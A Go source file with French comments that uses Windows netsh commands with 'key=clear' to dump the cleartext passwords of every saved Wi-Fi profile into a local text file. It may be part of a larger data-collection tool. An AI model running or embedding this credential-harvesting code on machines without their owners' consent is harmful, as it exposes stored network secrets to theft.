package getwifi

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"unicode"
)

// SaveWiFiPasswords récupère les mots de passe Wi-Fi et les sauvegarde dans un fichier.
func SaveWiFiPasswords() error {
	// Créer le dossier wifi s'il n'existe pas
	wifiDir := "DATA/wifi"
	err := os.MkdirAll(wifiDir, os.ModePerm)
	if err != nil {
		return fmt.Errorf("erreur lors de la création du dossier %s : %v", wifiDir, err)
	}

	// Obtenir les profils Wi-Fi
	cmd := exec.Command("netsh", "wlan", "show", "profiles")
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("erreur lors de l'exécution de la commande : %v", err)
	}

	profiles := extractProfiles(string(output))

	// Ouvrir le fichier pour écrire les mots de passe
	file, err := os.Create(wifiDir + "/wifi.txt")
	if err != nil {
		return fmt.Errorf("erreur lors de la création du fichier wifi.txt : %v", err)
	}
	defer file.Close()

	// Traiter chaque profil
	for _, profile := range profiles {
		password, err := getPasswordForProfile(profile)
		if err != nil {
			fmt.Fprintf(file, "Erreur lors de la récupération du mot de passe pour le profil %s : %v\n", profile, err)
			continue
		}
		if password != "" {
			fmt.Fprintf(file, "Profil : %s\nMot de passe : %s\n\n", profile, password)
		} else {
			fmt.Fprintf(file, "Profil : %s\nMot de passe : Non trouvé\n\n", profile)
		}
	}

	return nil
}

// Fonction pour extraire les noms de profils de la sortie de la commande
func extractProfiles(output string) []string {
	lines := strings.Split(output, "\n")
	var profiles []string
	for _, line := range lines {
		if strings.HasPrefix(line, "    Profil") {
			profile := strings.TrimSpace(strings.Split(line, ":")[1])
			profile = strings.TrimSpace(profile)
			profiles = append(profiles, profile)
		}
	}
	return profiles
}

// Fonction pour obtenir le mot de passe d'un profil spécifique
func getPasswordForProfile(profile string) (string, error) {
	cmd := exec.Command("netsh", "wlan", "show", "profile", "name="+profile, "key=clear")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("erreur lors de l'exécution de la commande pour le profil %s : %v", profile, err)
	}

	// Convertir la sortie en chaîne et chercher la ligne avec le mot de passe
	outputStr := string(output)
	lines := strings.Split(outputStr, "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "    Contenu de la ") || strings.HasPrefix(line, "    Clé de sécurité") {
			// Extraire le mot de passe en ignorant les caractères non reconnus
			password := extractPassword(line)
			return password, nil
		}
	}
	return "", nil
}

// Fonction pour extraire le mot de passe en ignorant les caractères non reconnus
func extractPassword(line string) string {
	parts := strings.Split(line, ":")
	if len(parts) > 1 {
		password := strings.TrimSpace(parts[1])
		var result strings.Builder
		for _, char := range password {
			if unicode.IsPrint(char) && !unicode.IsSpace(char) {
				result.WriteRune(char)
			}
		}
		return result.String()
	}
	return ""
}
